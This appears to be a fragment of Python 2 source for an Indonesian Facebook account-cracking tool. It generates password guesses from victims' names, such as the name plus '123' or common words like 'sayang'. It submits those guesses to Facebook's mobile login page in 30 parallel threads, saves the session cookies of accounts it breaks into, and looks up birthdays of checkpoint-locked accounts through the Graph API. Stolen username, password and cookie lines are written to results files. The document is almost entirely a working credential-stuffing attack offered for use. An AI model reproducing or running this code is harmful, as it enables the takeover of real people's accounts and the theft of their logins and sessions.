

    def __mfb__(self, user, __yan__):
        global ok,cp,loop
        sys.stdout.write('\r [%s*%s] [crack] %s/%s -> OK-:%s - CP-:%s '%(O,N,loop,len(self.id),len(ok),len(cp))),
        sys.stdout.flush()
        for pw in __yan__:
            pw = pw.lower()
            try: os.mkdir('results')
            except: pass
            try:
            	_kontol = open('YNTKTS.txt', 'r').read()
            except (KeyError, IOError):
            	_kontol = requests.get('https://raw.githubusercontent.com/Yayan-XD/ymbf/main/data/user_agent.txt').text.strip()
            ses = requests.Session()
            ses.headers.update({"Host":"m.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":_kontol,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
            p = ses.get("https://m.facebook.com")
            b = ses.post("https://m.facebook.com/login.php", data={"email": user, "pass": pw, "login": "submit"})
            if "c_user" in ses.cookies.get_dict().keys():
            	kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print '\r  %s* --> %s|%s|%s                 %s' % (H,user,pw,kuki,N)
                wrt = ' [✓] %s|%s|%s' % (user,pw,kuki)
                ok.append(wrt)
                open('results/OK-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue
            elif "checkpoint" in ses.cookies.get_dict().keys():
                try:
                    kontol = open('.pic/.fahim.txt').read()
                    ak = requests.get('https://graph.facebook.com/%s?access_token=%s'%(user,kontol))
                    az = json.loads(ak.text)
                    graph = az["birthday"]
                    month, day, year = graph.split("/")
                    month = bulan[month]
                    print '\r  %s* --> %s|%s|%s %s %s     %s' % (K,user,pw,day,month,year,N)
                    wrt = ' [×] %s|%s|%s %s %s' % (user,pw,day,month,year)
                    cp.append(wrt)
                    open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                    break
                except (KeyError, IOError):
                    month = ''
                    day = ''
                    year = ''
                except:
                    pass

                print '\r  %s* --> %s|%s                %s' % (K,user,pw,N)
                wrt = ' [×] %s|%s' % (user,pw)
                cp.append(wrt)
                open('results/CP-%s-%s-%s.txt' % (ha, op, ta), 'a').write('%s\n' % wrt)
                break
                continue

        loop += 1


    def __pler__(self):
        yan = raw_input('\n [*] method : ')
        if yan == '':
            print '\n %s[%s×%s] jangan kosong bro'%(N,M,N);self.__pler__()
        elif yan in ('1', '01'):
            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
            	for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        bb = yntks.split('<=>')
                        xz = bb[1].split(' ')
                        if len(xz) == 1:
                            raimuuu = [
                                xz[0], xz[0]+'123', xz[0]+'1234',
                                xz[0]+'12345',
                            ]
                        elif len(xz) == 2:
                            raimuuu = [
                                xz[0]+'123', xz[0]+'12345',
                                xz[1]+'123', xz[1]+'12345',
                            ]
                        elif len(xz) == 3:
                            raimuuu = [
                                xz[0]+'123', xz[0]+'12345',
                                xz[1]+'123', xz[1]+'12345',
                                xz[2]+'123', xz[2]+'12345',
                            ]
                        elif len(xz) == 4:
                            raimuuu = [
                                xz[0]+'123', xz[0]+'12345',
                                xz[1]+'123', xz[1]+'12345',
                                xz[2]+'123', xz[2]+'12345',
                                xz[3]+'123', xz[3]+'12345',
                            ]
                        else:
                            raimuuu = [
                                'sayang', 'anjing',
                                'bismillah', '123456'
                            ]
                        __yayanXD__.submit(self.__api__, bb[0], raimuuu)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok,cp)
        elif yan in ('2', '02'):
            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
            	for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        bb = yntks.split('<=>')
                        xz = bb[1].split(' ')
                        if len(xz) == 1:
                            raimuuu = [
                                xz[0], xz[0]+'123', xz[0]+'1234',
                                xz[0]+'12345',
                            ]
                        elif len(xz) == 2:
                            raimuuu = [
                                xz[0]+'123', xz[0]+'12345',
                                xz[1]+'123', xz[1]+'12345',
                            ]
                        elif len(xz) == 3:
                            raimuuu = [
                                xz[0]+'123', xz[0]+'12345',
                                xz[1]+'123', xz[1]+'12345',
                                xz[2]+'123', xz[2]+'12345',
                            ]
                        elif len(xz) == 4:
                            raimuuu = [
                                xz[0]+'123', xz[0]+'12345',
                                xz[1]+'123', xz[1]+'12345',
                                xz[2]+'123', xz[2]+'12345',
                                xz[3]+'123', xz[3]+'12345',
                            ]
                        else:
                            raimuuu = [
                                'sayang', 'anjing',
                                'bismillah', '123456'
                            ]
                        __yayanXD__.submit(self.__mbasic__, bb[0], raimuuu)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok,cp)
        elif yan in ('3', '03'):
            print '\n [%s+%s] hasil OK disimpan ke -> results/OK-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print ' [%s+%s] hasil CP disimpan ke -> results/CP-%s-%s-%s.txt'%(O,N,ha, op, ta)
            print '\n [%s!%s] anda bisa mematikan data selular untuk menjeda proses crack\n'%(M,N)
            with YayanGanteng(max_workers=30) as (__yayanXD__):
            	for yntks in self.id: # Yo Ndak Tau Kok Tanya Saia
                    try:
                        bb = yntks.split('<=>')
                        xz = bb[1].split(' ')
                        if len(xz) == 1:
                            raimuuu = [
                                xz[0], xz[0]+'123', xz[0]+'1234',
                                xz[0]+'12345',
                            ]
                        elif len(xz) == 2:
                            raimuuu = [
                                xz[0]+'123', xz[0]+'12345',
                                xz[1]+'123', xz[1]+'12345',
                            ]
                        elif len(xz) == 3:
                            raimuuu = [
                                xz[0]+'123', xz[0]+'12345',
                                xz[1]+'123', xz[1]+'12345',
                                xz[2]+'123', xz[2]+'12345',
                            ]
                        elif len(xz) == 4:
                            raimuuu = [
                                xz[0]+'123', xz[0]+'12345',
                                xz[1]+'123', xz[1]+'12345',
                                xz[2]+'123', xz[2]+'12345',
                                xz[3]+'123', xz[3]+'12345',
                            ]
                        else:
                            raimuuu = [
                                'sayang', 'anjing',
                                'bismillah', '123456'
                            ]
                        __yayanXD__.submit(self.__mfb__, bb[0], raimuuu)
                    except:
                        pass

            os.remove(self.apk)
            hasil(ok,cp)

        else:
            print '\n %s[%s×%s] input yang bener'%(N,M,N);self.__pler__()

if __name__ == '__main__':
    os.system('git pull')
    moch_yayan()